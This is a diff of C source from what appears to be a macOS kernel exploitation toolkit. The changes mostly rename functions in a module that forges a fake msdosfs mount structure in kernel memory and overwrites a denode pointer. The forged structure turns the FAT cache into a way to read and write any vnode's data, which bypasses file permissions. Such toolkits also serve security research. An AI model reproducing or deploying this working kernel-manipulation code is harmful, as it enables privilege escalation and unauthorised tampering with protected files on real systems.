@@ -61,21 +61,21 @@
 ///
 
 
-struct xpl_util_vnode {
-    xpl_util_msdosfs_t msdosfs_util;
+struct xpl_vnode {
+    xpl_msdosfs_t msdosfs_util;
     int cctl_fd;
     uintptr_t msdosfs_mount;
     uintptr_t cctl_denode;
-    xpl_util_pipe_t fake_mount_pipe;
+    xpl_pipe_t fake_mount_pipe;
     char msdosfs_mount_backup[TYPE_MSDOSFSMOUNT_SIZE];
 };
 
 
-xpl_util_msdosfs_t xpl_util_vnode_init_vol(void) {
-    xpl_util_msdosfs_t vol = xpl_util_msdosfs_mount(64, MNT_DONTBROWSE | MNT_DEFWRITE | MNT_ASYNC);
+xpl_msdosfs_t xpl_vnode_init_vol(void) {
+    xpl_msdosfs_t vol = xpl_msdosfs_mount(64, MNT_DONTBROWSE | MNT_DEFWRITE | MNT_ASYNC);
     
-    char mount[sizeof(xpl_MOUNT_TEMP_DIR)];
-    xpl_util_msdosfs_mount_point(vol, mount);
+    char mount[sizeof(XPL_MOUNT_TEMP_DIR)];
+    xpl_msdosfs_mount_point(vol, mount);
     
     char cctl_file[PATH_MAX];
     snprintf(cctl_file, sizeof(cctl_file), "%s/cctl", mount);
@@ -88,21 +88,21 @@ xpl_util_msdosfs_t xpl_util_vnode_init_vol(void) {
     xpl_assert_errno(res);
     
     close(fd);
-    xpl_util_msdosfs_update(vol, MNT_DONTBROWSE | MNT_RDONLY);
+    xpl_msdosfs_update(vol, MNT_DONTBROWSE | MNT_RDONLY);
     
     return vol;
 }
 
 
-xpl_util_vnode_t xpl_util_vnode_create(void) {
-    xpl_util_msdosfs_t msdosfs_util = xpl_util_vnode_init_vol();
+xpl_vnode_t xpl_vnode_create(void) {
+    xpl_msdosfs_t msdosfs_util = xpl_vnode_init_vol();
     
-    char mount_point[sizeof(xpl_MOUNT_TEMP_DIR)];
-    xpl_util_msdosfs_mount_point(msdosfs_util, mount_point);
+    char mount_point[sizeof(XPL_MOUNT_TEMP_DIR)];
+    xpl_msdosfs_mount_point(msdosfs_util, mount_point);
     
     uintptr_t proc = xpl_xnu_proc_current_proc();
     
-    int mount_fd = xpl_util_msdosfs_mount_fd(msdosfs_util);
+    int mount_fd = xpl_msdosfs_mount_fd(msdosfs_util);
     uintptr_t mount_vnode;
     int error = xpl_xnu_proc_find_fd_data(proc, mount_fd, &mount_vnode);
     xpl_assert_err(error);
@@ -122,18 +122,18 @@ xpl_util_vnode_t xpl_util_vnode_create(void) {
     uintptr_t cctl_dep = xpl_kmem_read_ptr(cctl_vnode, TYPE_VNODE_MEM_VN_DATA_OFFSET);
     xpl_assert_cond(xpl_kmem_read_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET), ==, msdosfs_mount);
     
-    xpl_util_vnode_t util = malloc(sizeof(struct xpl_util_vnode));
+    xpl_vnode_t util = malloc(sizeof(struct xpl_vnode));
     util->msdosfs_util = msdosfs_util;
     util->cctl_fd = cctl_fd;
     util->msdosfs_mount = msdosfs_mount;
     util->cctl_denode = cctl_dep;
-    util->fake_mount_pipe = xpl_util_pipe_create(TYPE_MSDOSFSMOUNT_SIZE);
+    util->fake_mount_pipe = xpl_pipe_create(TYPE_MSDOSFSMOUNT_SIZE);
     
     xpl_kmem_read(util->msdosfs_mount_backup, msdosfs_mount, 0, sizeof(util->msdosfs_mount_backup));
-    xpl_util_pipe_write(util->fake_mount_pipe, util->msdosfs_mount_backup, sizeof(util->msdosfs_mount_backup));
+    xpl_pipe_write(util->fake_mount_pipe, util->msdosfs_mount_backup, sizeof(util->msdosfs_mount_backup));
     
     /// Instead of directly changing the actual `struct msdosfsmount`, we will create a fake
-    /// `struct msdosfsmount` and set the member `de_pmp` of the `struct denode` of the `cctl_fd`.
+    /// `struct msdosfsmount` and assign it to `denode->de_pmp` of the `cctl_fd`.
     /// This will only make FS operations on `cctl_fd` to use this fake mount. This is done to
     /// prevent the background thread `pm_sync_timer` started by `msdosfs.kext` when the file
     /// system is mounted, from interfering with the changed FAT vnode and cache
@@ -141,18 +141,18 @@ xpl_util_vnode_t xpl_util_vnode_create(void) {
     /// NOTE: keep this kmem write at the end because this module is used to create
     /// `kmem_fast` and the boostrap kmem implementation used to create `kmem_fast`
     /// might prefer all write ops performed after read (eg: `xpl_kmem/kmem_boostrap.c`)
-    xpl_kmem_write_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, xpl_util_pipe_get_address(util->fake_mount_pipe));
+    xpl_kmem_write_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, xpl_pipe_get_address(util->fake_mount_pipe));
     
     return util;
 }
 
-void xpl_util_vnode_flush_cache(xpl_util_vnode_t util) {
+void xpl_vnode_flush_cache(xpl_vnode_t util) {
     /// Trigger `msdosfs_fat_cache_flush`
     int error = fcntl(util->cctl_fd, F_FLUSH_DATA);
     xpl_assert_err(error);
 }
 
-void xpl_util_vnode_populate_cache(xpl_util_vnode_t util) {
+void xpl_vnode_populate_cache(xpl_vnode_t util) {
     /// Trigger `msdosfs_fat_map`
     struct log2phys args;
     bzero(&args, sizeof(args));
@@ -163,7 +163,7 @@ void xpl_util_vnode_populate_cache(xpl_util_vnode_t util) {
     xpl_assert(errno == EIO || errno == E2BIG);
 }
 
-void xpl_util_vnode_read_kernel(xpl_util_vnode_t util, uintptr_t vnode, uintptr_t dst, size_t size) {
+void xpl_vnode_read_kernel(xpl_vnode_t util, uintptr_t vnode, uintptr_t dst, size_t size) {
     char mount[TYPE_MSDOSFSMOUNT_SIZE];
     memcpy(mount, util->msdosfs_mount_backup, sizeof(mount));
     
@@ -192,24 +192,24 @@ void xpl_util_vnode_read_kernel(xpl_util_vnode_t util, uintptr_t vnode, uintptr_
     *pm_fat_active_vp = vnode;
     
     /// Update fake_mount associated to `cctl_fd`
-    xpl_util_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
+    xpl_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
     
     /// Use `cctl_fd` to trigger FAT cache populate
-    xpl_util_vnode_populate_cache(util);
+    xpl_vnode_populate_cache(util);
 }
 
-void xpl_util_vnode_read_user(xpl_util_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
+void xpl_vnode_read_user(xpl_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
     xpl_assert_cond(size, <=, UINT32_MAX);
     /// Temporary storage for `dst` data in kernel memory
     uintptr_t buffer;
     xpl_allocator_small_mem_t buffer_alloc = xpl_allocator_small_mem_allocate(size, &buffer);
-    xpl_util_vnode_read_kernel(util, vnode, buffer, size);
+    xpl_vnode_read_kernel(util, vnode, buffer, size);
     /// Read the vnode data from kernel memory to `dst`
     xpl_kmem_read(dst, buffer, 0, size);
     xpl_allocator_small_mem_destroy(&buffer_alloc);
 }
 
-void xpl_util_vnode_write_kernel(xpl_util_vnode_t util, uintptr_t vnode, uintptr_t src, size_t size) {
+void xpl_vnode_write_kernel(xpl_vnode_t util, uintptr_t vnode, uintptr_t src, size_t size) {
     char mount[TYPE_MSDOSFSMOUNT_SIZE];
     memcpy(mount, util->msdosfs_mount_backup, sizeof(mount));
     
@@ -239,25 +239,25 @@ void xpl_util_vnode_write_kernel(xpl_util_vnode_t util, uintptr_t vnode, uintptr
     /// `msdosfs_meta_flush_internal` will be called
     *pm_sync_timer = 0;
     
-    xpl_util_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
-    xpl_util_vnode_flush_cache(util);
+    xpl_pipe_write(util->fake_mount_pipe, mount, sizeof(mount));
+    xpl_vnode_flush_cache(util);
 }
 
-void xpl_util_vnode_write_user(xpl_util_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
+void xpl_vnode_write_user(xpl_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
     /// Copy `src` data from user land to kernel memory
     uintptr_t buffer;
     xpl_allocator_small_mem_t buffer_alloc = xpl_allocator_small_mem_allocate(size, &buffer);
     xpl_kmem_write(buffer, 0, (void*)src, size);
-    xpl_util_vnode_write_kernel(util, vnode, buffer, size);
+    xpl_vnode_write_kernel(util, vnode, buffer, size);
     xpl_allocator_small_mem_destroy(&buffer_alloc);
 }
 
-void xpl_util_vnode_destroy(xpl_util_vnode_t* util_p) {
-    xpl_util_vnode_t util = *util_p;
+void xpl_vnode_destroy(xpl_vnode_t* util_p) {
+    xpl_vnode_t util = *util_p;
     xpl_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
     close(util->cctl_fd);
-    xpl_util_msdosfs_unmount(&util->msdosfs_util);
-    xpl_util_pipe_destroy(&util->fake_mount_pipe);
+    xpl_msdosfs_unmount(&util->msdosfs_util);
+    xpl_pipe_destroy(&util->fake_mount_pipe);
     free(util);
     *util_p = NULL;
 }
